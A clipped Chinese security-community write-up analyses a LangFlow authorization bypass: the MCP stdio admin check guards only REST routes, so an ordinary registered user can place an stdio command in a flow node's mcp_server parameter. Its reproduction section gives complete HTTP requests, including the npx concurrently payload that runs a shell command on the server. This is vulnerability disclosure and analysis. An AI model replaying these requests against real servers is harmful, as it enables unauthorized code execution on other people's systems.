---
title: 【先知】LangFlow任意 npm/PyPI 包代码执行漏洞
source: https://xz.aliyun.com/news/92807
source_host: xz.aliyun.com
clip_date: 2026-09-11T13:43:33+08:00
trace_id: d785f69d-7441-485a-9338-df11764a21fc
content_hash: 8b2c219b9341a6c79dd9fd212dd777ca48cc7bdb22bd170e0ff887e14ac9c206
status: synced
tags:
  - 先知
  - 漏洞分析
  - AI应用
series: null
feed_source: 先知安全技术社区
ai_summary: LangFlow 的 MCP stdio 授权检查只部署在 REST 路由，攻击者可用普通注册账号经流程图组件参数绕过，实现任意 npm/PyPI 包代码执行。
ai_summary_style: key-points
images_status:
  total: 19
  succeeded: 19
  failed_urls: []
notion_page_id: 3d875244-d011-81c2-ba79-da1464bc1d04
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> LangFlow 的 MCP stdio 授权检查只部署在 REST 路由，攻击者可用普通注册账号经流程图组件参数绕过，实现任意 npm/PyPI 包代码执行。
> 
> - **根因：** `ensure_mcp_stdio_access`（`langflow/api/v2/mcp.py`）全项目四个调用点均在 `/api/v2/mcp/servers` REST 路由，流程图节点参数这条入口完全不经该检查。
> - **执行链无身份校验：** `POST /api/v1/flows/` 创建内嵌 stdio 配置的 MCPTools 组件后，`POST /api/v1/run/{flow_id}` 走 `update_tools → _connect_to_server → anyio.open_process`，进程拉起边界只查命令内容、不查调用者身份。
> - **哈希白名单可绕：** `ALLOW_CUSTOM_COMPONENTS=false` 的组件哈希比对只覆盖 `code` 字段，恶意内容写在 `mcp_server` 参数里不参与哈希；官方模板源码经 `GET /api/v1/all` 对所有登录用户可见，可原样复制。
> - **命令白名单薄弱：** `mcp_server_allowed_packages` 默认关闭，白名单命令允许 `npx`，可用 `["-y","concurrently","touch /tmp/langflow_success"]` 直接落地命令执行。
> - **复现路径：** 注册用户 → 登录取 access_token → 抄 MCPTools 模板 → 建携带恶意 `mcp_server` 的 flow → 签发 API key → 触发 run 即执行成功。

## 漏洞描述

MCP stdio 服务器配置的授权检查仅部署于 REST 层，经流程图组件参数路径可完全绕过，导致任意 npm/PyPI 包执行

## 环境搭建

搭建加固后的非开发环境的langflow，只开通公开注册功能

LANGFLOW_NEW_USER_IS_ACTIVE=true

LANGFLOW_ENABLE_SIGNUP=true

```plain
python3 -m venv .venv
.venv/bin/pip install --upgrade pip
.venv/bin/pip install langflow
```

放到当前目录prod.env

```plain
LANGFLOW_AUTO_LOGIN=false
# 关闭匿名超管签发。默认 true 时 GET /api/v1/auto_login 零凭据返回超管 JWT

LANGFLOW_SUPERUSER=admin
LANGFLOW_SUPERUSER_PASSWORD=Admin@123
# 真实管理员账户，替代 AUTO_LOGIN 的内置超管。

LANGFLOW_NEW_USER_IS_ACTIVE=true
# 开启不用审批

LANGFLOW_ENABLE_SIGNUP=true
# 开启公开注册

LANGFLOW_WEBHOOK_AUTH_ENABLE=true
# webhook 端点要求 API key（该项默认已为 true，显式声明）。

LANGFLOW_ALLOW_CUSTOM_COMPONENTS=false
# 核心加固：仅允许执行与服务端已知模板哈希一致的组件代码。
# 直接目的是关闭 LF-02（用户提交任意 Python 源码被服务端 compile+exec）。

LANGFLOW_CUSTOM_COMPONENT_ADMIN_ONLY=true
# 第二道：组件代码编辑限制为管理员。与上一条构成"代码执行"的双闸门。

LANGFLOW_RESTRICT_LOCAL_FILE_ACCESS=true
# 内置文件类组件只允许读用户存储目录内的路径。
# 关闭 LF-03 的入口（读 ~/.cache/langflow/secret_key）。

LANGFLOW_FALLBACK_TO_ENV_VAR=false
# 全局变量解析禁止回退读进程环境变量，防止流程读取服务器环境中的
# 未列入 denylist 的第三方密钥。

LANGFLOW_CONNECTOR_SSRF_ALLOW_LOOPBACK=false
# 连接器类组件禁止访问 loopback，压缩 SSRF 面。

LANGFLOW_CORS_ORIGINS=http://192.168.102.154:7861
# CORS 从默认 * 收紧为显式白名单。

LANGFLOW_MCP_SERVER_DOCKER_HARDENING=true
# MCP docker 传输启用严格旗标策略（禁 -v 挂载、--network host 等）。

LANGFLOW_MCP_SERVER_INTERPRETER_HARDENING=true
# MCP stdio 禁止 python/node 直调入口（python3 -c / node script 等形态被拒）。

LANGFLOW_DATABASE_URL=sqlite:////home/kali/lf-hardened/prod_langflow.db

DO_NOT_TRACK=true
```

启动langflow

```plain
./.venv/bin/python -m langflow run --host 0.0.0.0 --port 7861 --no-dev --no-open-browser --env-file prod.env
```

## 漏洞原理

Langflow 对 MCP stdio 类型的服务器配置实现了管理员专属授权检查 `ensure_mcp_stdio_access` ：当代码执行受限策略生效（ `allow_custom_components=false` 或 `custom_component_admin_only=true` ）时，仅超级用户可配置 stdio 服务器。

使用注册的账户配置stdio服务器时，显示没有权限，仅允许administrators来配置

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/58f7e98fa915112f.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f8ec909b7afb82fa.png)

在代码 `langflow/api/v2/mcp.py:42` ：中

该检查存在位置缺陷：其在全项目中的四个调用点全部位于 `/api/v2/mcp/servers` REST 路由

```plain
def ensure_mcp_stdio_access(server_config: dict, current_user: CurrentActiveUser, settings: object) -> None:
    """Restrict local MCP processes when custom code execution is restricted."""
    mode = server_config.get("mode")
    is_stdio = bool(server_config.get("command")) or (isinstance(mode, str) and mode.lower() == "stdio")
    code_execution_restricted = (
        getattr(settings, "allow_custom_components", True) is False
        or getattr(settings, "custom_component_admin_only", False) is True
    )

    if is_stdio and code_execution_restricted and getattr(current_user, "is_superuser", False) is not True:
        raise HTTPException(
            status_code=403,
            detail="MCP stdio servers are restricted to administrators when custom code execution is restricted.",
        )
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e6b65be40b5cafb4.png)

而 MCP stdio 配置进入系统还有第二个入口：

流程图节点参数。经 `POST /api/v1/flows/` 创建携带 stdio 配置的 MCPTools 组件、 `POST /api/v1/run/{flow_id}` 触发执行时，调用链 `update_tools → _connect_to_server → anyio.open_process` 在进程拉起边界不做任何调用者身份检查。

源码注释表明开发者已认识到"flow 内嵌配置绕过 REST 层校验"的威胁并做过应对，但 `validate_mcp_stdio_config` 只覆盖命令、参数、环境变量三个维度，不含调用者身份

https://github.com/langflow-ai/langflow/blob/09ef6b2b7119e35a6787fc249f916f8b47b28615/src/backend/base/langflow/api/v2/mcp.py

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/37c69a107c28f4a2.png)

进程被真正启动之前的最后一道检查，也只查命令内容、不查谁在调用，进程经 MCP SDK 的 `anyio.open_process` （POSIX）/ `create_windows_process` （Windows）拉起

https://github.com/langflow-ai/langflow/blob/09ef6b2b7119e35a6787fc249f916f8b47b28615/src/lfx/src/lfx/base/mcp/util.py#L1898

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cc5ead4665cb9acc.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cd827180e2f6b8cf.png)

ALLOW_CUSTOM_COMPONENTS=false的设计意图是用户不许运行自己写的代码。只有服务器认识的、官方内置的组件代码才许跑，通过计算原版的组件hash来进行比对

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eaa176da7cd3082b.png)

创建组件被拒绝，同样只允许administrators

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/97391de4f6f36d4a.png)

官方 MCPTools 模板源码经 GET /api/v1/all 对所有登录用户可见

http://192.168.102.154:7861/api/v1/all

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c3c092bbaaf8f2f8.png)

通过获取到mcptools的原版代码，组件代码无需更改,恶意内容全部写在代码字段旁边的 mcp_server 参数里，而参数不参与哈希

mcp_server_allowed_packages 虽然是白名单限制，但是默认是关闭的

https://github.com/langflow-ai/langflow/blob/09ef6b2b7119e35a6787fc249f916f8b47b28615/src/lfx/src/lfx/services/settings/groups/mcp.py#L89

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/547ad9ebfa55f6c8.png)

https://github.com/langflow-ai/langflow/blob/09ef6b2b7119e35a6787fc249f916f8b47b28615/src/lfx/src/lfx/base/mcp/source_policy.py#L220

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/27699b9db5e24e4b.png)

只允许白名单里面的命令执行，同时对bash等命令进行了包装器的检查

https://github.com/langflow-ai/langflow/blob/09ef6b2b7119e35a6787fc249f916f8b47b28615/src/lfx/src/lfx/base/mcp/security.py#L47

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4e588ab0ea7d558e.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bbc46f08c0598128.png)

## 漏洞复现

注册用户

```plain
POST /api/v1/users/ HTTP/1.1
Host: 192.168.102.154:7861
Content-Type: application/json
Content-Length: 37

{"username":"test","password":"test"}
```

```plain
HTTP/1.1 201 Created
date: Wed, 19 Aug 2026 15:42:11 GMT
server: uvicorn
content-length: 330
content-type: application/json

{"id":"9f165dd8-5b43-488b-9c88-5492c75a6f24","username":"test","profile_image":null,"store_api_key":null,"is_active":true,"is_superuser":false,"create_at":"2026-08-19T15:42:11.906113","updated_at":"2026-08-19T15:42:11.906120","last_login_at":null,"optins":{"github_starred":false,"dialog_dismissed":false,"discord_clicked":false}}
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b801af1da9b595f3.png)

登陆获取令牌Token,此Token用于后面的数据包中

```plain
POST /api/v1/login HTTP/1.1
Host: 192.168.102.154:7861
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

```plain
HTTP/1.1 200 OK
date: Wed, 19 Aug 2026 15:43:05 GMT
server: uvicorn
content-length: 435
content-type: application/json
set-cookie: refresh_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5ZjE2NWRkOC01YjQzLTQ4OGItOWM4OC01NDkyYzc1YTZmMjQiLCJ0eXBlIjoicmVmcmVzaCIsImV4cCI6MTc4Nzc1ODk4Nn0.9r7GJqE8tgYbeap9TX93d6U8I6Qq5azaBmj6SG-4vts; expires=Wed, 26 Aug 2026 15:43:06 GMT; HttpOnly; Path=/; SameSite=lax
set-cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5ZjE2NWRkOC01YjQzLTQ4OGItOWM4OC01NDkyYzc1YTZmMjQiLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzg3MTU3Nzg2fQ.Vlt6MtssrBbKCZ1EWHIj4nF-RJMJ3eDIn1kUzyIrhiU; expires=Wed, 19 Aug 2026 16:43:06 GMT; HttpOnly; Path=/; SameSite=lax
set-cookie: apikey_tkn_lflw=None; HttpOnly; Path=/; SameSite=lax

{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5ZjE2NWRkOC01YjQzLTQ4OGItOWM4OC01NDkyYzc1YTZmMjQiLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzg3MTU3Nzg2fQ.Vlt6MtssrBbKCZ1EWHIj4nF-RJMJ3eDIn1kUzyIrhiU","refresh_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5ZjE2NWRkOC01YjQzLTQ4OGItOWM4OC01NDkyYzc1YTZmMjQiLCJ0eXBlIjoicmVmcmVzaCIsImV4cCI6MTc4Nzc1ODk4Nn0.9r7GJqE8tgYbeap9TX93d6U8I6Qq5azaBmj6SG-4vts","token_type":"bearer"}
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ca836d8e872ecee9.png)

获取mcptools模板源码

http://192.168.102.154:7861/api/v1/all

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c3c092bbaaf8f2f8.png)

创建携带恶意参数的流程，将上面value中的模板源码原版复制到下面的请求包中,这里使用concurrently 来执行命令 "args": \["-y", "concurrently", "touch /tmp/langflow_success"\]

```plain
POST /api/v1/flows/ HTTP/1.1
Host: TARGET:7861
Authorization: Bearer <TOKEN>
Content-Type: application/json
Content-Length: 58129

{
  "name": "job-1787151281",
  "description": "d",
  "is_component": false,
  "data": {
    "nodes": [
      {
        "id": "m",
        "type": "genericNode",
        "position": {"x": 0, "y": 0},
        "data": {
          "id": "m",
          "type": "MCPTools",
          "display_name": "MCPTools",
          "node": {
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "required": true,
                "placeholder": "",
                "list": false,
                "show": true,
                "multiline": true,
                "value": "<MCPTools原样复制>"
              },
              "mcp_server": {
                "type": "mcp",
                "name": "mcp_server",
                "value": {
                  "name": "helper",
                  "config": {
                    "command": "npx",
                    "args": ["-y", "concurrently", "touch /tmp/langflow_success"]
                  }
                },
                "required": false,
                "placeholder": "",
                "list": false,
                "show": true,
                "_input_type": "MCPInput"
              }
            },
            "outputs": [
              {
                "name": "response",
                "display_name": "R",
                "method": "build_output",
                "types": ["Tool"],
                "selected": "Tool",
                "cache": true,
                "allow_multiple": false
              }
            ],
            "description": "d",
            "base_classes": ["object"],
            "display_name": "MCPTools"
          }
        }
      }
    ],
    "edges": [],
    "viewport": {}
  }
}
```

创建成功，这个id记住，后面要用

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d69fe6684a3e7574.png)

签发key

```plain
POST /api/v1/api_key/ HTTP/1.1
Host: TARGET:7861
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5ZjE2NWRkOC01YjQzLTQ4OGItOWM4OC01NDkyYzc1YTZmMjQiLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzg3MTU3Nzg2fQ.Vlt6MtssrBbKCZ1EWHIj4nF-RJMJ3eDIn1kUzyIrhiU
Content-Type: application/json
Content-Length: 19

{"name":"demo-key"}
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/98da40eaebbd2820.png)

成功执行命令

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2abdcb452ebc0949.png)
